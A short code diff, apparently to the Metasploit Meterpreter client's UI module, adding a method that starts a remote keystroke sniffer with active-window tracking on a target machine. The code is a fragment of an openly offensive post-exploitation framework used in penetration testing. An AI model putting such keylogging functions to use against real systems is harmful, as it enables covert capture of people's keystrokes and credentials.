@@ -214,6 +214,15 @@ class UI < Rex::Post::UI
   end
 
   #
+  # Start the keyboard sniffer with active window tracking
+  #
+  def keyscan_start_aw
+    request  = Packet.create_request('stdapi_ui_start_keyscan_actwin')
+    response = client.send_request(request)
+    return true
+  end
+
+  #
   # Stop the keyboard sniffer
   #
   def keyscan_stop
